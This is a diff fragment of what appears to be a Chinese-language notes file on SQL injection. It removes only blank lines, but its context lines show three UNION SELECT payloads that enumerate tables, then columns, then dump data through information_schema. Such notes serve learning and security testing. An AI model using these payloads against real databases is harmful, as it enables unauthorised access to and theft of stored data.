@@ -38,9 +38,6 @@
    查表: union select group_concat(table_name) from information_schema.tables where table_schema=database()
    查列: union select group_concat(column_name) from information_schema.columns where table_name=0X十六进制
    查数据: union select group_concat(null) from 库名.表名
-
-   
-
 ```
 
 
